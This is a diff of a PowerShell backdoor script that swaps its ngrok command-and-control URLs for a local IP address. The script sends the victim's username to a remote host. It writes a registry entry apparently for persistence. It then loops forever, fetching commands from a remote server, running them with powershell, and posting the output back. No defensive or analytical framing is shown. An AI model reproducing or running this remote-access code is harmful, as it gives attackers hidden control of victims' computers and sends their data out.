@@ -6,7 +6,7 @@ $hmal += "New Connection from "
 
 $hmal += whoami
 
-$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://4d60d432aae4.ngrok.app -Body $hmal -UseBasicParsing
+$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $hmal -UseBasicParsing
 
 #attempt to set per
 
@@ -23,13 +23,13 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCo
 while ($true)
 {
 
-	$I = Invoke-WebRequest -Timeout 1 'https://e7d45510bd9a.ngrok.app' | Select-Object -Expand Content
+	$I = Invoke-WebRequest -Timeout 1 '192.168.2.190:80' | Select-Object -Expand Content
 
 	$MAIN = powershell /c $I 
 
 	if($MAIN -eq $FALSE){
 	}else{ 
-	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI https://4d60d432aae4.ngrok.app -Body $MAIN -UseBasicParsing	
+	$Response = Invoke-WebRequest -Timeout 1 -Method Post -URI 192.168.2.190:4444 -Body $MAIN -UseBasicParsing	
 	}
 	sleep 0.5
 }
